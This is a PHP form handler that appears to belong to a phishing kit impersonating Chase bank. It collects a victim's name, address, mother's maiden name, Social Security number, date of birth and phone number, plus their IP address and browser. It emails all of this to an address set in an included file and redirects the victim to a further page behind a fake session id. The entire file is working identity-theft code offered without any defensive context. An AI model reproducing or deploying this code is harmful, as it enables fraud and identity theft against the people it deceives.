<?php
if($_POST["name"] != "" and $_POST["addr"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Chase Info-----------------------\n";
$message .= "Full Name              : ".$_POST['name']."\n";
$message .= "Address              : ".$_POST['addr']."\n";
$message .= "City              : ".$_POST['city']."\n";
$message .= "State              : ".$_POST['state']."\n";
$message .= "Postal Code              : ".$_POST['zp']."\n";
$message .= "MMN              : ".$_POST['mn']."\n";
$message .= "SSN              : ".$_POST['sn']."\n";
$message .= "DOB              : ".$_POST['db']."\n";
$message .= "Phone Number              : ".$_POST['ph']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf4.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>